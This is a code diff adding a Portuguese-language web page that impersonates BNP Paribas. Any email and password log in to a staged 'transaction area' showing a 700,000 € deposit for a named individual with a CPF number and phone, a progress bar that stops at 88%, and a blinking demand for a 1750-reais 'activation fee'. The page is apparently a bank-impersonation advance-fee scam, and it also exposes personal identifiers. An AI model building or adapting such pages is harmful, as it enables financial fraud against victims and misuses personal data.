@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BNP PARIBAS BANCO</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+        body { 
+            background-image: url(R.png);
+        }
+
+        .blink {
+            animation: blinker 1s linear infinite;
+            background: red;
+            color: white;
+            width: 100px;
+            font-weight: bold;
+        }
+
+        @keyframes blinker {
+            50% {
+                opacity: 0;
+            }
+        }
+
+        .progress-bar {
+            width: 100%;
+            background-color: #f1f1f1;
+            border-radius: 5px;
+            padding: 3px;
+            position: relative;
+        }
+
+        .progress-bar-inner {
+            height: 20px;
+            width: 0;
+            background-color: #4CAF50;
+            border-radius: 5px;
+            transition: width 0.5s;
+        }
+
+        .progress-bar-label {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-weight: bold;
+            color: #fff;
+        }
+
+        #logout {
+            position: absolute;
+            top: 0;
+            right: 0;
+            margin: 10px;
+        }
+
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        #loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="login-area">
+        <h1 class="text-center">Bem-vindo ao seu Banco BNP PARIBAS pessoal</h1>
+        <i class="fa fa-bank" style="font-size:48px;color:red"></i>
+        <div class="input-field">
+            <input type="email" id="email" class="form-control" placeholder="Enter your E-mail">
+            <br>
+            <input type="password" id="password" class="form-control" placeholder="Enter your password">
+            <br>
+            <button class="btn btn-success" id="login">Conecte-se</button>
+        </div>
+    </div>
+    <div id="transaction-area" style="display: none;">
+        <h1 class="text-center">Transação DA Área do BANCO BNP PARIBAS</h1>
+        <i class="fa fa-bank" style="font-size:36px"></i>
+         <div class="account-details">
+            <p><i class="fa fa-user" style="color: #4CAF50;"></i> <strong>NOME COMPLETO:</strong> Washington Lima de Souza</p>
+            <p><i class="fa fa-globe" style="color: #4CAF50;"></i> <strong>NATURALIDADE:</strong> GOIANA-GO</p>
+            <p><i class="fa fa-map-marker" style="color: #4CAF50;"></i> <strong>PAÍS:</strong> BRASIL</p>
+            <p><i class="fa fa-id-card" style="color: #4CAF50;"></i> <strong>CPF:</strong> 002.276.011-30</p>
+            <p><i class="fa fa-building" style="color: #4CAF50;"></i> <strong>Nome do contato:</strong> Banco CAIXA POUPANÇA</p>
+            <p><i class="fa fa-phone" style="color: #4CAF50;"></i> <strong>Número de contato:</strong> 870613363-9</p>
+            <p><i class="fa fa-bank" style="color: #4CAF50;"></i> <strong>AGÊNCIA:</strong> 0793</p>
+            <p><i class="fa fa-map-signs" style="color: #4CAF50;"></i> <strong>PO:</strong> 013</p>
+        </div>
+        <div class="row d-flex justify-content-around">
+            <div class="col-md-3 py-3">
+                <div class="deposit status">
+                    <h5>Depósito</h5>
+                    <h1><span id="current-deposit">700.000 €</span></h1>
+                </div>
+            </div>
+            <div class="col-md-3 py-3">
+                <div class="balance status">
+                    <h5>STATUS: TRANSFERÊNCIA EM ANDAMENTO</h5>
+                    <div class="progress-bar">
+                        <div class="progress-bar-inner" id="progress"></div>
+                        <div class="progress-bar-label" id="progress-label">0%</div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3 py-3">
+                <div class="balance status">
+                    <h5>DATA DA RECEITA</h5>
+                    <h1><span id="current-balance">17/08/2023</span></h1>
+                </div>
+            </div>
+            <div class="col-md-3 py-3">
+                <i class="fa fa-warning" style="font-size:48px;color:red"></i>
+                <div class="blink" style="display: flex; align-items: center; justify-content: center;">AVISO</div>
+                <div class="balance status">
+                    <h1><span id="current-balance">TAXA DE ATIVAÇÃO 1750 REAIS</span></h1>
+                </div>
+            </div>
+        </div>
+         <div id="logout" style="display: none; position: fixed; bottom: 0; left: 50%; transform: translateX(-50%);">
+  <button id="logout-button" class="btn btn-outline-primary">Logout</button>
+</div>
+    </div>
+
+    <div id="loading-overlay" style="display: none;">
+        <div id="loading-spinner"></div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/noframework.waypoints.min.js"></script>
+    <script>
+        function animateProgressBar(targetPercentage) {
+            const progressBar = document.getElementById("progress");
+            const progressLabel = document.getElementById("progress-label");
+            let currentPercentage = 0;
+
+            const animationInterval = setInterval(() => {
+                if (currentPercentage >= targetPercentage) {
+                    clearInterval(animationInterval);
+                    return;
+                }
+
+                currentPercentage++;
+                progressBar.style.width = currentPercentage + "%";
+                progressLabel.textContent = currentPercentage + "%";
+            }, 30);
+        }
+
+        const progressBar = document.querySelector(".progress-bar");
+        const waypoint = new Waypoint({
+            element: progressBar,
+            handler: function () {
+                animateProgressBar(88);
+                this.destroy();
+            },
+            offset: "bottom-in-view"
+        });
+
+        const loginButton = document.getElementById("login");
+        loginButton.addEventListener("click", function () {
+            const loginArea = document.getElementById("login-area");
+            const transactionArea = document.getElementById("transaction-area");
+            const loadingOverlay = document.getElementById("loading-overlay");
+
+            // Affiche le chargement
+            loadingOverlay.style.display = "flex";
+
+            // Simule un délai de chargement de 2 secondes
+            setTimeout(function () {
+                // Masque l'interface de connexion
+                loginArea.style.display = "none";
+                // Affiche l'interface de transaction
+                transactionArea.style.display = "block";
+                // Masque le chargement
+                loadingOverlay.style.display = "none";
+            }, 2000);
+        });
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
